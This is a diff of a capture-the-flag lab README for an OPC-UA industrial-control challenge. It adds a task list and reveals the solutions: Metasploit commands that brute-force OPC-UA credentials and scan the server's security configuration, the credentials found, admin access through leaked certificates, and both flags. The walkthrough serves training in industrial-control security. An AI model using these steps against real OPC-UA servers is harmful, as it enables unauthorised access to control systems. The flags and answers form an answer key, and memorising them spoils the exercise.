@@ -46,10 +46,18 @@ If this is successful, follow step 4 and use *opcua_login* to brute force creden
 
 In the case of a successful brute force attack, you should see the username and password labeled *success* as output. This procedure can also be traced in Wireshark and the usernames and passwords used in the attack can be read out in plaintext. 
 
-## 🎯 Find the User Flag
+## 🎯 Task
+Brute-force OPC-UA credentials, explore the server security configuration, and use leaked certificates to gain admin access.
+
 The flag has the format `CybICS(flag)`.
 
-**💡 Hint**: The flag is readable on the OPC UA system of the user, which you need to brute force
+### Steps
+1. Set up Metasploit and load the opcua_login module
+2. Configure the module with the target IP, port 4840, and credentials file
+3. Run the brute-force attack to discover valid OPC-UA credentials
+4. Connect to the OPC-UA server with the discovered credentials and read the user flag
+5. Use the opcua_server_config module to investigate the server's security configuration
+6. Locate the leaked certificates and use them to authenticate as admin
 
 ## 🛡️ Security Framework References
 
@@ -86,12 +94,14 @@ The flag has the format `CybICS(flag)`.
 
 </details>
 
+
+## 💡 Hints
+
+The flag is readable on the OPC UA system of the user, which you need to brute force.
+
 ## 🔍 Solution (User Flag)
 
-<details>
-  <summary><span style="color:orange;font-weight: 900">Click to expand</span></summary>
-
-  Check if connection to OPC UA works with:
+Check if connection to OPC UA works with:
   ```
   msf6 > use auxiliary/scanner/opcua/opcua_hello
   msf6 auxiliary(scanner/opcua/opcua_hello) > set rhosts 10.0.0.1
@@ -126,22 +136,17 @@ The flag has the format `CybICS(flag)`.
 
   Username: user1
   Password: test
-  
-  <div style="color:orange;font-weight: 900">
-    🚩 Flag: CybICS(OPC-UA)
-  </div>
+
+**Flag:** `CybICS(OPC-UA)`
+
   ![Flag opcua](doc/opcua_user.png)
-</details>
 
 ## 🛡️ Getting an Overview of the Security Configuration
 Use the metasploit module `auxiliary/scanner/opcua/opcua_server_config` for this investigation
 
 ## 🔍 Solution (Security Configuration)
 
-<details>
-  <summary><span style="color:orange;font-weight: 900">Click to expand</span></summary>
-
-  ```
+```
   msf6 > use auxiliary/scanner/opcua/opcua_server_config
   msf6 auxiliary(scanner/opcua/opcua_server_config) > set rhosts 10.0.0.1
   msf6 auxiliary(scanner/opcua/opcua_server_config) > set rport 4840
@@ -150,7 +155,6 @@ Use the metasploit module `auxiliary/scanner/opcua/opcua_server_config` for this
   msf6 auxiliary(scanner/opcua/opcua_server_config) > set authentication Username
   msf6 auxiliary(scanner/opcua/opcua_server_config) > run
   ```
-</details>
 
 ## 🛡️ Getting Admin Access
 Previously, you had read-only access to the variables, which meant you could view but not modify them.
@@ -189,18 +193,13 @@ Certificates in OPC UA are essential for establishing secure, authenticated, and
 
 ## 🔍 Solution (Admin Access)
 
-<details>
-  <summary><span style="color:orange;font-weight: 900">Click to expand</span></summary>
-
-  Use opcua-client and configure on `Connect option` the usage of the certificate.
+Use opcua-client and configure on `Connect option` the usage of the certificate.
   ```
   opcua-client
   ```
 
   Now you can change the variable `Set > 0 to obtain flag!` to a value bigger than zero and access the variable for the admin flag `adminFLAG`
 
-  <div style="color:orange;font-weight: 900">
-    🚩 Flag: CybICS(OPC-UA-$ADMIN)
-  </div>
+**Flag:** `CybICS(OPC-UA-$ADMIN)`
+
   ![Flag opcua](doc/opcua_admin.png)
-</details>
